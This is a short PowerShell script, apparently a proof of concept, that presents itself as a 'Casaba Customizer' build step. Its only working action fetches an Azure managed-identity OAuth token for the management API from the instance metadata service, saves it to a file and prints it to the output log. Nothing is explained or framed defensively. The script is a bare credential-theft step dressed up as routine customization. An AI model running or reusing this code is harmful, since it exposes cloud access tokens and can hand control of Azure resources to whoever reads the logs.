filter timestamp {"$(Get-Date ([datetime]::UtcNow) -Format G) UTC: $_"}
Write-Output "Running Casaba Customizer..." | timestamp
Invoke-WebRequest "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H @{"Metadata" = "true"} -UseBasicParsing -OutFile meta.txt
$result=Get-Content "meta.txt"
Write-Output "Finishing up..."
Write-Output $result
Write-Output "Exiting" | timestamp
